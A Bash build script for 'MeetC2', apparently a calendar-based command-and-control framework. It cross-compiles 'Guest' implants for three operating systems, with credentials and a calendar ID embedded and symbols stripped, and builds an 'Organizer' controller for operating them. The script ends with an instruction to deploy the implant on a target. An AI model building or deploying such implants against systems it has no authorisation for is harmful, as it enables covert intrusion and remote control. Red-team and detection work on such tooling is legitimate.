#!/bin/bash

# MeetC2 Builder
# Builds Guest and Organizer for Linux, macOS, and Windows (AMD64 & ARM64)

if [ "$1" == "clean" ]; then
    echo "Cleaning build artifacts..."
    rm -f guest guest-linux guest-linux-arm64 guest-darwin guest-darwin-arm64 guest-windows.exe guest-windows-arm64.exe
    rm -f organizer organizer-linux organizer-linux-arm64 organizer-darwin organizer-darwin-arm64 organizer-windows.exe organizer-windows-arm64.exe
    echo "Clean complete."
    exit 0
fi

if [ $# -lt 2 ]; then
    echo "Usage: ./build-all.sh <credentials.json> <calendar_id>"
    echo "       ./build-all.sh clean"
    echo ""
    echo "This builds Guest and Organizer binaries for Linux, macOS, and Windows."
    exit 1
fi

CREDS_FILE="$1"
CALENDAR_ID="$2"

if [ ! -f "$CREDS_FILE" ]; then
    echo "Error: Credentials file not found: $CREDS_FILE"
    exit 1
fi

echo "MeetC2 Complete Build Process"
echo "================================"

echo ""
echo "Downloading dependencies..."
go mod tidy

echo ""
echo "Building Guest implants..."
echo "--------------------------------"
if [ "$CREDS_FILE" != "credentials.json" ]; then
    cp "$CREDS_FILE" credentials.json
fi

echo "Building Guest for current platform..."
go build -ldflags "-s -w -X main.embedCalendarID=$CALENDAR_ID" -o guest guest.go

echo "Building Guest for Linux (AMD64)..."
GOOS=linux GOARCH=amd64 go build -ldflags "-s -w -X main.embedCalendarID=$CALENDAR_ID" -o guest-linux guest.go

echo "Building Guest for Linux (ARM64)..."
GOOS=linux GOARCH=arm64 go build -ldflags "-s -w -X main.embedCalendarID=$CALENDAR_ID" -o guest-linux-arm64 guest.go

echo "Building Guest for macOS (AMD64)..."
GOOS=darwin GOARCH=amd64 go build -ldflags "-s -w -X main.embedCalendarID=$CALENDAR_ID" -o guest-darwin guest.go

echo "Building Guest for macOS (ARM64)..."
GOOS=darwin GOARCH=arm64 go build -ldflags "-s -w -X main.embedCalendarID=$CALENDAR_ID" -o guest-darwin-arm64 guest.go

echo "Building Guest for Windows (AMD64)..."
GOOS=windows GOARCH=amd64 go build -ldflags "-s -w -X main.embedCalendarID=$CALENDAR_ID" -o guest-windows.exe guest.go

echo "Building Guest for Windows (ARM64)..."
GOOS=windows GOARCH=arm64 go build -ldflags "-s -w -X main.embedCalendarID=$CALENDAR_ID" -o guest-windows-arm64.exe guest.go

echo ""
echo "Building Organizer..."
echo "--------------------------------"
cd controller

echo "Building Organizer for current platform..."
go build -ldflags "-s -w" -o ../organizer organizer.go

echo "Building Organizer for Linux (AMD64)..."
GOOS=linux GOARCH=amd64 go build -ldflags "-s -w" -o ../organizer-linux organizer.go

echo "Building Organizer for Linux (ARM64)..."
GOOS=linux GOARCH=arm64 go build -ldflags "-s -w" -o ../organizer-linux-arm64 organizer.go

echo "Building Organizer for macOS (AMD64)..."
GOOS=darwin GOARCH=amd64 go build -ldflags "-s -w" -o ../organizer-darwin organizer.go

echo "Building Organizer for macOS (ARM64)..."
GOOS=darwin GOARCH=arm64 go build -ldflags "-s -w" -o ../organizer-darwin-arm64 organizer.go

echo "Building Organizer for Windows (AMD64)..."
GOOS=windows GOARCH=amd64 go build -ldflags "-s -w" -o ../organizer-windows.exe organizer.go

echo "Building Organizer for Windows (ARM64)..."
GOOS=windows GOARCH=arm64 go build -ldflags "-s -w" -o ../organizer-windows-arm64.exe organizer.go

cd ..

echo ""
echo "Build Summary"
echo "================"
echo ""
echo "Guest implants (with embedded credentials):"
ls -lh guest* 2>/dev/null | grep -E "guest|guest-linux|guest-linux-arm64|guest-darwin|guest-darwin-arm64|guest-windows\.exe|guest-windows-arm64\.exe" || echo "No guest binaries found!"
echo ""
echo "Organizer binaries:"
ls -lh organizer* 2>/dev/null | grep -E "organizer|organizer-linux|organizer-linux-arm64|organizer-darwin|organizer-darwin-arm64|organizer-windows\.exe|organizer-windows-arm64\.exe" || echo "No organizer binaries found!"
echo ""
echo "Build complete! Deploy Guest on target, control it with Organizer."
